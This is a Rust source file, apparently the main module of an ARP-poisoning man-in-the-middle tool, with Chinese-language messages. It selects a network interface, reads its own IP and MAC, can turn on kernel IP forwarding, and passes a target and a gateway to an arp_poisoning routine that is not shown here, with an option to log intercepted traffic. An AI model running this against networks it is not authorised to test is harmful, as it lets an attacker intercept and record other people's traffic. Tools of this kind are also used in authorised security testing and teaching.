mod arp;
mod utils;

extern crate pcap;

use std::net::{IpAddr, Ipv4Addr};
use pcap::Device;
use crate::utils::{get_interface_mac_addr, ip_forward, mac_to_string};


pub struct ArgOptions {
    pub interface: String,
    pub target_ip: Ipv4Addr,
    pub gateway_ip: Ipv4Addr,
    pub ip_forward: bool,
    pub log_traffic: bool,
}

fn resolve_own_ip_addr(device: &Device) -> Option<Ipv4Addr> {
    device
        .addresses
        .iter()
        .filter_map(|i| match i.addr {
            IpAddr::V4(ipv4) => Some(ipv4),
            _ => None,
        })
        .last()
}

pub fn arp_poison(options: ArgOptions) {
    let all_devices = Device::list().expect("无法列出设备");
    let device = match all_devices
        .into_iter()
        .filter(|d| d.name == options.interface)
        .last()
    {
        Some(d) => d,
        None => {
            panic!("给定的接口 \"{}\" 未找到", options.interface)
        }
    };


    let own_ip_addr = match resolve_own_ip_addr(&device) {
        Some(ip) => ip,
        None => {
            panic!("无法获取该接口的IP地址!")
        }
    };
    let own_mac_addr = get_interface_mac_addr(&options.interface);
    println!(r#"
    正在使用设备 {}
    IP地址: {}
    mac地址: {}
    连接状态: {:?}"#,
             device.name,
             own_ip_addr,
             mac_to_string(&own_mac_addr),
             device.flags.connection_status,
    );

    if options.ip_forward {
        ip_forward(options.ip_forward).expect("启用内核 IP 转发失败!");
    }

    arp::arp_poisoning(
        device,
        own_mac_addr,
        own_ip_addr,
        options.target_ip,
        options.gateway_ip,
        options.log_traffic,
    );
}